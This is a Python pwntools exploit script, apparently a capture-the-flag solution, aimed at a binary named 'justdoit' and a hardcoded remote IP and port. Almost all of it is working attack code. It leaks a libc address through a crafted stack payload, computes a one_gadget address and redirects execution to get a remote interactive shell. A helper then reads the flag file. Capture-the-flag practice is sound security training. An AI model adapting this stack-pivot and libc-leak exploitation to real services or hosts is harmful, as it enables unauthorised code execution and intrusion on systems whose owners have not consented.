# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './justdoit'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '47.106.172.144'
    port = '65004'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

one_gad = one_gadget(libc.path)

def attack():
    
    bss_addr = 0x404090
    text_addr = 0x4011F1
    text_addr2 = 0x40122F
    pop_rdi_ret = 0x4012b3
    atol_got = elf.got['atol']

    payload = p64(bss_addr) + p64(text_addr) 

    sa('name?',payload)
    sa('frends??' ,'-0000032')
    atol_addr = l64()
    libc.address = atol_addr - libc.sym['puts'] - 362

    system_addr = libc.sym['system']
    binsh_addr = libc.search('/bin/sh\x00').next()
    ogg = one_gad[1] + libc.address
    lg('ogg',ogg)

    lg('libc.address',libc.address)

    payload = p64(ogg) + p64(ogg) 
    # dbg('*0x40123E')
    se( payload )
    sa('frends??' ,'-0000032')

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   justdoit.py
@Time    :   2021/12/04 11:26:10
@Author  :   Niyah 
'''